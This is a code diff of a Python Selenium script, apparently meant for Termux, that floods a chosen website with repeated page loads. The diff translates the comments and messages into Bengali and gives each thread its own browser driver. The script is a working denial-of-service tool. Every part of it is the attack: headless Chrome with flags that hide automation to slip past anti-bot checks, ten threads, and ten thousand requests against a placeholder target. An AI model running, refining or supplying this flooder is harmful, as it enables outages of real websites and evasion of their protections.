@@ -4,36 +4,29 @@ from selenium.webdriver.chrome.options import Options
 import threading
 import time
 
-# ✅ Setup Chrome Browser with Anti-Bot Bypass
+# ✅ Chrome ব্রাউজার সেটআপ (Anti-Bot Bypass)
 chrome_options = Options()
-chrome_options.add_argument("--headless")  # Background mode
+chrome_options.add_argument("--headless")  # ব্যাকগ্রাউন্ড মোড
 chrome_options.add_argument("--disable-blink-features=AutomationControlled")
 chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
 chrome_options.add_experimental_option("useAutomationExtension", False)
 
-# Global variable to store the ChromeDriver instance for reuse
-driver = None
-
-# ✅ Initialize the WebDriver (Only Once for All Threads)
-def init_driver():
-    global driver
-    if driver is None:
-        service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Correct path for Termux
-        driver = webdriver.Chrome(service=service, options=chrome_options)
-
-# ✅ Start Attack Function
+# ✅ অ্যাটাক ফাংশন
 def attack(url, total_requests):
-    init_driver()  # Ensure the driver is initialized before starting the attack
+    service = Service("/data/data/com.termux/files/usr/bin/chromedriver")  # Termux এর জন্য পাথ
+    driver = webdriver.Chrome(service=service, options=chrome_options)
 
     for _ in range(total_requests):
         try:
             driver.get(url)
-            print(f"🔥 Attack Sent to {url}")
+            print(f"🔥 {url} এ অ্যাটাক পাঠানো হয়েছে")
             time.sleep(0.5)
         except Exception as e:
-            print(f"❌ Failed: {e}")
+            print(f"❌ ব্যর্থ: {e}")
     
-# ✅ Multi-Threaded Attack
+    driver.quit()  # থ্রেড শেষ হলে ড্রাইভার বন্ধ করা
+
+# ✅ মাল্টি-থ্রেডেড অ্যাটাক ফাংশন
 def start_attack(url, total_requests, threads):
     thread_list = []
     for _ in range(threads):
@@ -44,14 +37,10 @@ def start_attack(url, total_requests, threads):
     for thread in thread_list:
         thread.join()
 
-# ✅ Run Attack
+# ✅ অ্যাটাক চালানো
 if __name__ == "__main__":
-    target_url = "https://target-website.com"  # ✅ Change this to the target URL
-    total_requests = 10000  # ✅ Number of total requests
-    threads = 10  # ✅ Number of Threads (Parallel Attacks)
+    target_url = "https://target-website.com"  # আপনার টার্গেট URL এখানে দিন
+    total_requests = 10000  # মোট রিকোয়েস্ট সংখ্যা
+    threads = 10  # থ্রেডের সংখ্যা (পারালাল অ্যাটাক)
     
     start_attack(target_url, total_requests, threads)
-
-    # Cleanup driver after attack is complete
-    if driver:
-        driver.quit()
